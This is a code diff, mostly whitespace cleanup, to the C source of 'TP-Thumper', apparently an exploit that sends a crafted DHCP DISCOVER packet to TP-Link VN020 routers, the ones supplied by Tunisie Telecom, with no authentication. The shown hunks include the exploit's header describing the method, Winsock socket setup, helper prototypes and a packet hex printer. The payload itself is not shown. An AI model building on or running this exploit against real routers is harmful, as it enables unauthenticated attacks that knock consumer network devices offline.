@@ -20,7 +20,7 @@
  * - No authentication required
  * - Affects all routers running VN020 Fv(t) specifically the ones
  *   supplied by Tunisie Telecom
- * 
+ *
  * Exploitation Method:
  * ------------------
  * 1. Sends crafted DHCP DISCOVER packet
@@ -48,7 +48,7 @@
  */
 
 
-// Disable deprecation warnings for older Winsock functions
+ // Disable deprecation warnings for older Winsock functions
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <Ws2tcpip.h>
 #include <stdio.h>
@@ -69,17 +69,18 @@
 void create_dhcp_discover_packet(unsigned char* packet, int* packet_length);
 void add_option(unsigned char* packet, int* offset, unsigned char option,
     unsigned char length, unsigned char* data);
+void tp_link(unsigned char* packet, int* offset);
 void print_packet_hex(unsigned char* packet, int length);
 int wait_for_response(SOCKET sock, int timeout);
 
 int main() {
-    WSADATA wsa;                            
-    SOCKET sock;                            
-    struct sockaddr_in dest;                
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in dest;
     unsigned char packet[MAX_PACKET_SIZE];  // Buffer for DHCP packet
     int packet_length = 0;                  // Length of constructed packet
     int attempts = 0;                       // Counter for send attempts
-    int success = 0;   
+    int success = 0;
 
 
     printf("[TP-Thumper] Initializing Winsock...\n");
@@ -324,7 +325,7 @@ void print_packet_hex(unsigned char* packet, int length) {
         }
         printf("\n");
         i += 2 + option_length;
-        if (packet[i] == 0xFF) {  
+        if (packet[i] == 0xFF) {
             printf("  End of Options\n");
             break;
         }
